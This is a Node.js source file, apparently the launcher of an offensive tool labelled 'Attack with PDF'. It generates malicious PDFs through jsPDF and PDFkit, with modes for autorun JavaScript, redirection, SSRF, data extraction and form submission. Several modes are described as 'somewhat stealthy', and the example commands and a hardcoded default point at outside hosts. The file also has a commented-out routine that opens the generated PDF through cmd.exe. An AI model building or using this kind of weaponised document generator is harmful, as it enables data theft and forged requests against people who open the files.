const { ArgumentParser } = require('argparse');
const { version } = require('../package.json');
const chalk = require('chalk');
const { spawn } = require('child_process');
var kill = require('tree-kill');

const parser = new ArgumentParser({
  description: 'Attack with PDF',
  usage: " node main.js -l,--lib {jsPDF|PDFkit [-L,--list]} -e,--exploit [-o,--output] [-u,--URI] \n\t"+
  chalk.blue("- [ Basic Examples ] -\n\t")+
  "Attack-Mode  | Library | Example command\n\t" +
  "=============+========================================================\n\t"+
  "simple_js    |  jsPDF  | node main.js -l jsPDF -e simple_js\n\t"+
  "PDFSSRF      |  jsPDF  | node main.js -l jsPDF -e PDFSSRF -u http.tacocat.tk\n\t"+
  "Redirection  |  jsPDF  | node main.js -l jsPDF -e redirection -u http.tacocat.tk\n\t"+
  "Extraction   |  jsPDF  | node main.js -l jsPDF -e extraction -u http.tacocat.tk\n\t"+
  "Extraction   |  PDFkit | node main.js -l PDFkit -e js_submitForm -u http.tacocat.tk\n\t"


});
 
parser.add_argument('-l', '--lib', { help: 'Select library to exploit jsPDF or PDFkit', required:true});
parser.add_argument('-e', '--exploit', { help: 'Specify exploit to use'});
parser.add_argument('-L', '--List', { help: 'List avaliable exploits for jsPDF or PDFkit library', action:'store_true' });
parser.add_argument('-o', '--output', { help: 'Specify output file name'});
parser.add_argument('-u', '--uri', { help: 'Specify URI to inject/SSRF'});


function list_jsPDF_exploits(){
	console.log('Avaliable exploits for', chalk.blueBright('jsPDF'), 'are: \n\tautorun \n\tsimple_js \n\tredirection \n\tPDFSSRF (somewhat stealthy) \n\textraction (somewhat stealthy)')
}


function list_PDFkit_exploits(){
	console.log('Avaliable exploits for', chalk.blueBright('PDFkit'), 'are: \n\tjs_submitForm')
}


function checkArgs(myArgs){
	if (myArgs.lib){
		if(myArgs.lib !== "jsPDF" && myArgs.lib !== "PDFkit"){
			console.log(chalk.redBright("[!] Unknown library, please run -l [jsPDF|PDFkit] -L to list out avaliable exploits"))
			return 0
		}
		// pass lib check, continue with other checks
	}

	// checks if user wants to list avaliable expoits
	if (myArgs.List) 
	{
		// requires user to narrow which lib to display 
		if (myArgs.lib == 'jsPDF'){
			list_jsPDF_exploits()
		}else if (myArgs.lib == 'PDFkit'){
			list_PDFkit_exploits()
		} else {
			console.log(chalk.redBright("[!] Unknown library, please run -l [jsPDF|PDFkit] -L to list out avaliable exploits"))
		}
		return 0
	}

	// program cant run if exploit not defined
	if (myArgs.exploit == undefined)
	{
		console.log(chalk.red("[!] No exploit given, run -l [jsPDF|PDFkit] -L to list out avaliable exploits"))
		return 0
	}

	if (myArgs.output == undefined)
	{
		console.log(chalk.redBright("[*] No output file name was given, will use default name"))
	}
	return 1
}

async function createExploit(vuln_lib, exploit, outname, direction='http://20.211.25.32/index.php'){
	switch(vuln_lib){
	case 'jsPDF':
		const jsPDF_template = require("./jsPDF_template.js");
		const template_jsPDF = new jsPDF_template;
		
		var jsPDF_dict = {'autorun': template_jsPDF.bake_autorun,
		'simple_js': template_jsPDF.bake_simple_js,
		'redirection': template_jsPDF.bake_redirection,
		'PDFSSRF': template_jsPDF.bake_PDFSSRF,
		'extraction': template_jsPDF.bake_extraction}
		if (jsPDF_dict.hasOwnProperty(exploit)){
			// console.log(template_jsPDF)
			console.log("[*] Generating", exploit, "...");
			template_status = jsPDF_dict[exploit](outname, direction)
			if (template_status[1] == 1){
				if(template_status.length == 3){
					return [1, "[+] Finished bake " + chalk.yellowBright(exploit) + ", saved to " + chalk.yellowBright(template_status[0]) + "\n\tURL: " + chalk.blue(direction), template_status[0]]	
				} else {
					return [1, "[+] Finished bake " + chalk.yellowBright(exploit) + ", saved to " + chalk.yellowBright(template_status[0]), template_status[0]]			
				}
			} else {			
				return [-1, chalk.red("[!] Failed to bake" + exploit)] 
			}
		} else {
			return [-1, chalk.red("[!] Invalid exploit, run the command node main.js -l jsPDF -L for avaliable exploits")] 
		}
		
		break;
	case 'PDFkit':
		// console.log("running PDFkit");
		const PDFkit_template = require("./PDFkit_template.js");
		const template_PDFkit = new PDFkit_template;
		var PDFkit_dict = {'js_submitForm': template_PDFkit.js_submitForm} 
		if (PDFkit_dict.hasOwnProperty(exploit) ){
			console.log("[*] Generating ", exploit, "...");
			let get_myfile_status = new Promise((res, rej) => {
	        	template_status = PDFkit_dict[exploit](outname, direction)
				template_status.then(status => {
				if (status[1] == 1){
					if(status.length == 3){
						message = [1, "[+] Finished bake " + chalk.cyan(exploit) + ", saved to " + chalk.cyan(status[0]) + "\n\tURL: " + chalk.blue(direction), status[0]]	
					} else {
						message = [1, "[+] Finished bake " + chalk.cyan(exploit) + ", saved to " + chalk.cyan(status[0]), status[0]]			
					}
				}else {			
					message = [-1, chalk.red("[!] Failed to bake" + exploit)] 
				}
				})
		        setTimeout(() => res(message), 1000)
	    	});

		    let result = await get_myfile_status; 
			return message
		} else {
				return [-1, chalk.red("[!] Invalid exploit, run the command node main.js -l jsPDF -L for avaliable exploits")] 
		}
		break;
	default:
		console.log("[!] Some error occured and idk what :(")
		return -1
		break;
	}
}


function sleep(ms) {
  return new Promise((resolve) => {
    setTimeout(resolve, ms);
  });
}


async function test_exploit(pdf){
	pdf = __dirname + "\\" + pdf + "\r\n"
	// console.log(pdf)
	const test_pdf_proc = spawn('cmd.exe', ['/C', pdf]);
	console.log("[*] Testing process started with PID:", test_pdf_proc.pid)
	await sleep(1000)
	console.log("[*] Using npm kill-tree to kill shell and opened PDF:",test_pdf_proc.pid)
	kill(test_pdf_proc.pid)
	console.log(chalk.greenBright("[+] Test successful!"))

}

async function main(){
	myArgs = parser.parse_args()
	// console.log(myArgs)
	if(checkArgs(myArgs) == 0){
		process.exit(0)
	}
	const vuln_lib = myArgs.lib;
	const exploit = myArgs.exploit
	const outname = myArgs.output
	const direction = myArgs.uri

	const myfile = await createExploit(vuln_lib, exploit, outname, direction)
	console.log(chalk.greenBright(myfile[1]))
	// if(myfile[0] == 1){
	// 	console.log(chalk.redBright("[*] Spawning shell to run", myfile[2], "in 3 seconds ..."))
	// 	console.log("[!] Press ctrl + c to terminate")
	// 	await sleep(3000)
	// 	// test_exploit(myfile[2])
	// }
}



main()
